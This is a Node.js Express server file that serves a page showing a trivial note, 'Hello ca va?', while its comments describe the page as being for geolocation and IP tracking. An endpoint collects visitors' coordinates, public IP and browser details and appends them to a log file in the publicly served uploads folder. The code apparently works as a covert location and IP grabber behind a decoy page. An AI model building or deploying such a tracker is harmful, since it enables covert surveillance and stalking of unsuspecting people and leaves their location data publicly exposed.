const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

// Middleware for parsing JSON and URL-encoded form data
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Set the view engine to EJS
app.set('view engine', 'ejs');

// Set the directory for the views (EJS templates)
app.set('views', path.join(__dirname, 'views'));

// Create uploads folder if it doesn't exist
const uploadsDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
    console.log("Uploads directory created.");
}

// Endpoint to render the index1 page (for geolocation, IP tracking)
app.get('/', (req, res) => {
    const noteId = 'hello-ca-va';  // Static content for Note 1
    const noteContent = "Hello ca va?";
    
    // Render the index1.ejs file with the provided noteId and noteContent
    res.render('index1', { noteId, noteContent });
});

// Endpoint to log client data (geolocation, IP, browser info)
app.post('/log-client-data', (req, res) => {
    const { latitude, longitude, publicIP, browserInfo } = req.body;

    // Validate that all required data is present
    if (!latitude || !longitude || !publicIP || !browserInfo) {
        return res.status(400).json({ message: 'Invalid data' });
    }

    // Create a log entry
    const logEntry = `
Timestamp: ${new Date().toISOString()}
IP: ${publicIP}
Location: (${latitude}, ${longitude})
Browser Info: ${JSON.stringify(browserInfo, null, 2)}

`;

    // Path for the log file
    const logFilePath = path.join(__dirname, 'public', 'uploads', 'log.txt');

    // Append the log entry to the log file
    fs.appendFile(logFilePath, logEntry, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
            return res.status(500).json({ message: 'Failed to log data' });
        }
        res.json({ message: 'Client data logged successfully' });
    });
});

// Start the server and make it listen on all network interfaces (for local access)
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server 1 is running on http://localhost:${PORT}`);
});
